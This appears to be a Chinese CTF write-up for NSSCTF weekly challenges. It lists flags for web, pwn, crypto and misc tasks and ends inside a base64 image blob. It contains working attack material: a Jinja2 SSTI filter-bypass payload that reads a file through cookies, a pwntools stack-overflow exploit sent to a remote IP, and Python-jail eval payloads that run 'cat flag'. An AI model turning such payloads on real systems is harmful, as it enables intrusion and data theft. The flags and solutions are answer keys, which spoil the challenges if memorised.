<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211011735375.png?x-oss-process=hzy" alt="image-20221101173513297"></p>
<p>NSSCTF{b94b585e-b632-4ddd-9e91-eb77d89bc75e}</p>
<h2 id="week3ssssti">[WEEK3]ssssti</h2>
<p>显然存在ssti</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211011756124.png?x-oss-process=hzy" alt="image-20221101175606020"></p>
<p>fuzz发现过滤了如下</p>
<pre><code class="hljs plaintext">&#x27;
&quot;  
_  
args   
os  
不允许post</code></pre>
<p>使用request.cookies构造上述的payload</p>
<pre><code class="hljs plaintext">?name=&#123;&#123;self[request.cookies.c][request.cookies.d][request.cookies.e][request.cookies.f][request.cookies.g].open(request.cookies.z).read()&#125;&#125;


cookie:c=__dict__;d=_TemplateReference__context;e=lipsum;f=__globals__;g=__builtins__;z=flag
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202211011800970.png?x-oss-process=hzy" alt="image-20221101180051880"></p>
<p>NSSCTF{c29e448f-55f7-4d9f-9d36-282a0e14d0e0}</p>
<h1 id="pwn">PWN</h1>
<h2 id="week1easync">[Week1]easync</h2>
<p>两段flag，一个在nothing，一个在gift</p>
<p>nssctf{Nc_@nd_g3t5h31L}</p>
<h2 id="week1easyoverflow">[Week1]easyoverflow</h2>
<p>基础栈溢出漏洞</p>
<p>exp</p>
<pre><code class="hljs plaintext">from pwn import *
#p = process(&#x27;./easy_overflow&#x27;)
p = remote(&#x27;43.143.7.97&#x27;,28094)
pay= b&#x27;a&#x27;*54+p64(0x401214)
p.sendline(pay)
p.interactive()

</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021704229.png?x-oss-process=hzy" alt="image-20221002170420162"></p>
<p>nssctf{0h_You_OverFl0w_the_pr0gr@mm}</p>
<h2 id="week2ret2text">[WEEK2]ret2text</h2>
<blockquote>
<p>ret2text hint:远程环境存在栈对齐的问题（栈对齐是什么百度搜索） hint:试试partial overwrite绕过PIE</p>
</blockquote>
<p>花式栈溢出，不会</p>
<h1 id="crypto">CRYPTO</h1>
<h2 id="week1bababasesese">[Week1]baBAbaseSEse</h2>
<p>base套娃</p>
<p>92-91-85-64-32–hex</p>
<p>NSSCTF{th3re_1s_als0_b4se_36_45_58_62_100}</p>
<h2 id="week1你想学密码吗">[Week1]你想学密码吗？</h2>
<pre><code class="hljs plaintext"># encode = utf-8
# python3
# pycryptodemo 3.12.0

import Crypto.PublicKey as pk
from hashlib import md5
from functools import reduce

a = sum([len(str(i)) for i in pk.__dict__])
funcs = list(pk.__dict__.keys())
b = reduce(lambda a,b:a+b,[str(i) for i in funcs])
f = md5(b.encode()).hexdigest()
print(&#x27;NSSCTF&#123;&#x27; + f + &#x27;&#125;&#x27;)</code></pre>
<pre><code class="hljs plaintext">NSSCTF&#123;11db81a49b1826a3be8fb33f8ccb496d&#125;</code></pre>
<h2 id="week1baby_rsa">[Week1]baby_rsa</h2>
<pre><code class="hljs plaintext">from Crypto.Util.number import bytes_to_long, getPrime
from gmpy2 import *
from secret import flag
m = bytes_to_long(flag)
p = getPrime(128)
q = getPrime(128)
n = p * q
e = 65537
c = pow(m,e,n)
print(n,c)
# n=62193160459999883112594854240161159254035770172137079047232757011759606702281
# c=17331436837911040930486942133359735652484926528331507431552667656734821231501</code></pre>
<p>知道n,c,e</p>
<p>n分解p,q</p>
<p>p = 234560843346150602519484260867514743467<br>
q = 265147241000574873803071047177766359643</p>
<pre><code class="hljs plaintext">import libnum
from Crypto.Util.number import long_to_bytes
 
n=62193160459999883112594854240161159254035770172137079047232757011759606702281
c=17331436837911040930486942133359735652484926528331507431552667656734821231501

#n = int(&quot;&quot;,16)
e = 65537
#e = int(&quot;&quot;,16)

p = 234560843346150602519484260867514743467
q = 265147241000574873803071047177766359643


 
d = libnum.invmod(e, (p - 1) * (q - 1))
m = pow(c, d, n)   # m 的十进制形式
string = long_to_bytes(m)  # m明文
print(string)  # 结果为 b‘ m ’ 的形式</code></pre>
<p>NSSCTF{Welc0m3_t0_7h3_RSA_w0r1d}</p>
<h2 id="week2rsa-again">[WEEK2]RSA again</h2>
<p>题目如下</p>
<pre><code class="hljs plaintext">from Crypto.Util.number import *
from secret import flag

pad = lambda x:x + bytes([16 - len(x)%16] * (16 - len(x)%16))
m = bytes_to_long(pad(flag))
p = getPrime(1024)
q = getPrime(1024)
r = getPrime(1024)
s = getPrime(1024)

n1 = p*q
n2 = r*s

e1 = 0x3
e2 = 0x10001

c1 = pow(m,e1,n1)
c2 = pow(m,e2,n2)

print(f&#x27;n1 = &#123;n1&#125;&#x27;)
print(f&#x27;n2 = &#123;n2&#125;&#x27;)

print(f&#x27;e1 = &#123;e1&#125;&#x27;)
print(f&#x27;e2 = &#123;e2&#125;&#x27;)

print(f&#x27;c1 = &#123;c1&#125;&#x27;)
print(f&#x27;c2 = &#123;c2&#125;&#x27;)

&#x27;&#x27;&#x27;
n1 = 19920284552214772740140135352548541831031690920425912140961436065508824546041514076016684238261995522677433833330399269923572993489681770913908642529489382472548548664350078176417366141695108301338793624641102311886122714705781923892243561473766978666116035403145672686443197319003393949350402512739343998236331447680561106899174404316265329944969786438022711742891334905159259854026408058542492105569778656883811323759583727586331462200020945101286801110840081277963013591342157754264111051785385892113635682519079401538045775697382691195557344630571694510115674941400112478156619785019370731073096018975390492287333
n2 = 16329690193309629244191723145720681753145067517963214005637012320130767690248475184382159868590994476900972592910808281306311987027465355492106975220876976952805197358639881107619560544543352300924359258546945240852850094015390140482140815264345348655887196971643211396274684514779113163628885090661524523232327450873503097327714815509514869056066300689707819915660849896274673178482085029145101175879255721581466301617903290840675945809027289325795423671263820619585424051649443606301277124322653881307702397752575258862656767834175467463999624688529625582031941402015943516022965802189663157681884162493551612612033
e1 = 3
e2 = 65537
c1 = 1752041777918702842605810950957832076618830231626916748933875881505173164404519153781007066742915517004902508987841695668088780745675304779496841107726530280651344357647334690721873124324358539328142005709830859468027528835981960873390785515876157664035579935532043154959183555353553164481674735512873428044452976229459806219115571797514157279125
c2 = 13118485959563304540673377439664643422000629435115361166348221705991314239675693340024813013156594762061646798463551395329521013651893257141697813554253378348002502855822191264845788826850528723400519059095869424931054523865083127809240502348046515579012160733570975234405522250330692499687684922633627550243811524972452606330768418753137605045204137872122584136368073471612976975360656501198000053578279110813009137808852376287556012668702182416374333935081007133880603708035832346742292444210108820267460698390600228183548619401334969739679892562475501201965275739796687679445529050630235296740377171065357995433586
&#x27;&#x27;&#x27;
</code></pre>
<p>两道rsa，第一个是小e攻击</p>
<p>但是n很大，yafu分解</p>
<h2 id="week2strange-rsa">[WEEK2]strange RSA</h2>
<pre><code class="hljs plaintext">from Crypto.Util.number import *
from secret import flag

pad = lambda x:x + bytes([16 - len(x)%16] * (16 - len(x)%16))
m = bytes_to_long(pad(flag))
p = getPrime(100)
q = getPrime(100)
n = p*p*q*q
e = 0x10001
c = pow(m,e,n)

print(f&#x27;n = &#123;n&#125;&#x27;)
print(f&#x27;c = &#123;c&#125;&#x27;)
print(f&#x27;e = &#123;e&#125;&#x27;)

&#x27;&#x27;&#x27;
n = 564070152909085514893862673848191100242629745476416876533996976389897932324860687952230733393080567203972999049426141761
c = 269509453821913281608300827585653465889617103481995203776655691658799441157871331220899710463748827149644657719450056013
e = 65537
&#x27;&#x27;&#x27;
</code></pre>
<p>直接yafu分解</p>
<pre><code class="hljs plaintext">P30 = 709662686105519282917793669093
P30 = 709662686105519282917793669093
P31 = 1058314117179226194777612760717
P31 = 1058314117179226194777612760717
</code></pre>
<p>然后一把梭</p>
<blockquote>
<p>ps:做题目一定要看清题，我刚开始以为就是正常的n，但是咋梭都出不来，后来再回来一看，n = p<em>p</em>q*q，，，，,我醉了</p>
</blockquote>
<p>p，q真实的值应该是开根之后</p>
<p>不对，这题我不会，哪位师傅留个言带带我</p>
<h2 id="week2md5太残暴了">[WEEK2]md5太残暴了</h2>
<p>题目如下</p>
<pre><code class="hljs plaintext">
小明养成了定期修改密码的好习惯，同时，他还是一个CTF爱好者。有一天，他突发奇想，用flag格式来设置密码，为了防止忘记密码，他还把密码进行了md5加密。为了避免被其他人看到全部密码，他还特意修改了其中部分字符为#。你能猜出他的密码吗？
plaintext = flag&#123;#00#_P4ssw0rd_N3v3r_F0rg3t_63####&#125;
md5 = ac7f4d52c3924925aa9c8a7a1f522451
PS: 第一个#是大写字母，第二个#是小写字母，其他是数字。
</code></pre>
<p>就是爆破呗，走起来</p>
<pre><code class="hljs plaintext">import hashlib
from turtle import right

for g in range(ord(&#x27;a&#x27;),ord(&#x27;z&#x27;)):
        for f in range(10):
            for e in range(10):
                for d in range(10):
                    for c in range(10):
                        for h in range(ord(&#x27;A&#x27;),ord(&#x27;Z&#x27;)):
                            for g in range(ord(&#x27;a&#x27;),ord(&#x27;z&#x27;)):
                        #for b in range(9):
                            #for a in range(9):
                                num=&quot;flag&#123;&quot;+chr(h)+&quot;00&quot;+chr(g)+&quot;_P4ssw0rd_N3v3r_F0rg3t_63&quot;+str(f)+str(e)+str(d)+str(c)+&#x27;&#125;&#x27;
                                num_sha = hashlib.md5(num.encode(&#x27;utf-8&#x27;)).hexdigest()
                                #print(num_sha)
                                print(num)
                                #print(num_sha)
                                right = &quot;ac7f4d52c3924925aa9c8a7a1f522451&quot;
                                
                                #right = &quot;f96d6e5d801f825d8f93aa7ed9e3922b&quot;
                                if(num_sha == right):
                                
                                    print(num)
                                    print(&#x27;success!!!&#x27;)
                                    print(&#x27;right flag!!!&#x27;)
                                    exit()</code></pre>
<p>静静等待然后就出了，二十分钟，不多不少刚刚好</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210141752354.png?x-oss-process=hzy" alt="image-20221014175238203"></p>
<p>flag{G00d_P4ssw0rd_N3v3r_F0rg3t_638291}</p>
<h2 id="week2hash">[WEEK2]hash</h2>
<p>大同小异</p>
<p>把上题的脚本浅浅改一下就可以用了</p>
<pre><code class="hljs plaintext">import hashlib
from turtle import right

#for g in range(ord(&#x27;a&#x27;),ord(&#x27;z&#x27;)):
for f in range(66,122):
    for e in range(66,122):
        for d in range(66,122):
            for c in range(66,122):
                #for h in range(ord(&#x27;A&#x27;),ord(&#x27;Z&#x27;)):
                            #for g in range(ord(&#x27;a&#x27;),ord(&#x27;z&#x27;)):
                        #for b in range(9):
                            #for a in range(9):
                                num=chr(f)+chr(e)+chr(d)+chr(c)+&#x27;PR6o0VJVhOvrobcr&#x27;
                                num_sha = hashlib.sha256(num.encode(&#x27;utf-8&#x27;)).hexdigest()
                                #print(num_sha)
                                print(num)
                                #print(num_sha)
                                right = &quot;b5d2e3943477e375bcd11a7af6f68c3973690a888333afff3f048fc5ba598029&quot;
                                
                                #right = &quot;f96d6e5d801f825d8f93aa7ed9e3922b&quot;
                                if(num_sha == right):
                                
                                    print(num)
                                    print(&#x27;success!!!&#x27;)
                                    print(&#x27;right flag!!!&#x27;)
                                    exit()</code></pre>
<p>远程交互</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210141810484.png?x-oss-process=hzy" alt="image-20221014181052217"></p>
<p>NSSCTF{ne4cat_1s_nece55arY_4nd_usefu1}</p>
<h1 id="misc">MISC</h1>
<h2 id="week1简单编码">[Week1]简单编码</h2>
<p>得到一个图片，url解码—&gt;base64解码—&gt;二进制转str得到flag</p>
<p>nssctf{nssctf_huanyingni}</p>
<h2 id="week1calc_jail_beginnerjail">[Week1]calc_jail_beginner(JAIL)</h2>
<p>附件如下</p>
<pre><code class="hljs plaintext">#Your goal is to read ./flag.txt
#You can use these payload liked `__import__(&#x27;os&#x27;).system(&#x27;cat ./flag.txt&#x27;)` or   `print(open(&#x27;/flag.txt&#x27;).read())`   // hint

WELCOME = &#x27;&#x27;&#x27;
  _     ______      _                              _       _ _ 
 | |   |  ____|    (_)                            | |     (_) |
 | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |
 | &#x27;_ \|  __| / _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|  _   | |/ _` | | |
 | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |
 |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|
               __/ |                                           
              |___/                                            
&#x27;&#x27;&#x27;

print(WELCOME)

print(&quot;Welcome to the python jail&quot;)
print(&quot;Let&#x27;s have an beginner jail of calc&quot;)
print(&quot;Enter your expression and I will evaluate it for you.&quot;)
input_data = input(&quot;&gt; &quot;)
print(&#x27;Answer: &#123;&#125;&#x27;.format(eval(input_data)))  // 即执行eval</code></pre>
<pre><code class="hljs plaintext">__import__(&#x27;os&#x27;).system(&#x27;cat flag&#x27;)</code></pre>
<p>NSSCTF{e3b53834-6ee0-4ccf-9f1a-9ef3a0941127}</p>
<h2 id="week1pizgalf">[Week1]piz.galf</h2>
<p>打开附件发现内容是颠倒的</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021841795.png?x-oss-process=hzy" alt="image-20221002184140710"></p>
<p>用两次这样的脚本</p>
<pre><code class="hljs plaintext">with open(&#x27;pmb.galf&#x27;,&#x27;rb&#x27;) as f:

   with open(&#x27;flag.bmp&#x27;,&#x27;wb&#x27;) as g:

      g.write(f.read()[::-1])
</code></pre>
<p>得到flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021842340.png?x-oss-process=hzy" alt="image-20221002184219282"></p>
<p>NSSCTF{d1r0w_0ll3h}</p>
<h2 id="week1my_png">[Week1]my_png</h2>
<p>藏了个压缩包，压缩包提示密码纯四位数字，直接掩码爆破</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021854716.png?x-oss-process=hzy" alt="image-20221002185415653"></p>
<p>解压得到flag</p>
<p>NSSCTF{welc0me_t0_StegAn0graphY!!!}</p>
<h2 id="week1python2-inputjail">[Week1]python2 input(JAIL)</h2>
<pre><code class="hljs plaintext"># It&#x27;s escape this repeat!

WELCOME = &#x27;&#x27;&#x27;
              _   _      ___        ___    _____             _    _ _   
             | | | |    / _ \      |__ \  |_   _|           | |  | | |  
  _ __  _   _| |_| |__ | | | |_ __    ) |   | |  _ __  _ __ | |  | | |_ 
 | &#x27;_ \| | | | __| &#x27;_ \| | | | &#x27;_ \  / /    | | | &#x27;_ \| &#x27;_ \| |  | | __|
 | |_) | |_| | |_| | | | |_| | | | |/ /_   _| |_| | | | |_) | |__| | |_ 
 | .__/ \__, |\__|_| |_|\___/|_| |_|____| |_____|_| |_| .__/ \____/ \__|
 | |     __/ |                                        | |               
 |_|    |___/                                         |_|                               
&#x27;&#x27;&#x27;

print WELCOME

print &quot;Welcome to the python jail&quot;
print &quot;But this program will repeat your messages&quot;
input_data = input(&quot;&gt; &quot;)
print input_data
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021942384.png?x-oss-process=hzy" alt="image-20221002194208252"></p>
<p>同上</p>
<p>NSSCTF{59945ba1-dea5-4c42-9f20-5f003b9c0eb4}</p>
<h2 id="week1三生三世">[Week1]三生三世</h2>
<p>附件是一个加密的压缩包，没有任何提示，凭直觉一点一点掩码爆破测试，得到密码xilan</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202210021955838.png?x-oss-process=hzy" alt="image-20221002195543746"></p>
<p>得到</p>
<pre><code class="hljs plaintext">data:image/jpg;base64,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